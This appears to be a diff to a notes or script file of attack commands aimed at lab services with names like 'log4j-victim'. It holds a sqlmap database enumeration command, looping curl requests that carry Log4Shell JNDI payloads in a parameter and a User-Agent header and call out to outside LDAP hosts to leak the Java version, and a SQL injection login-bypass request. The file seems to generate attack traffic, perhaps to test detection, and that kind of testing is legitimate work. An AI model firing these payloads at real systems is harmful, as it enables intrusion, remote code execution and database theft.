@@ -6,3 +6,10 @@ curl http://10.107.234.118:30000/index.php
 
 
 sqlmap -u "http://database.default.svc:80/index.php" --data="nombre_usuario=test&password=test" --dbs --batch
+
+while true; do curl --get --data-urlencode 'action=${jndi:ldap://${sys:java.version}.example.com}' http://log4j-victim.default.svc:8983/solr/admin/cores; sleep $((RANDOM % 15)); done
+
+while true; do curl -v -X GET "http://log4j-victim.default.svc:8983/solr/admin/cores" -H 'User-Agent: ${jndi:ldap://${sys:java.version}.badreputation.com}'; sleep $((RANDOM % 15)); done
+
+
+curl -X POST 'http://192.168.1.225/index.php' --data-raw 'nombre_usuario=1%27+OR+%271%27%3D%271%27%23&password=aaadf'
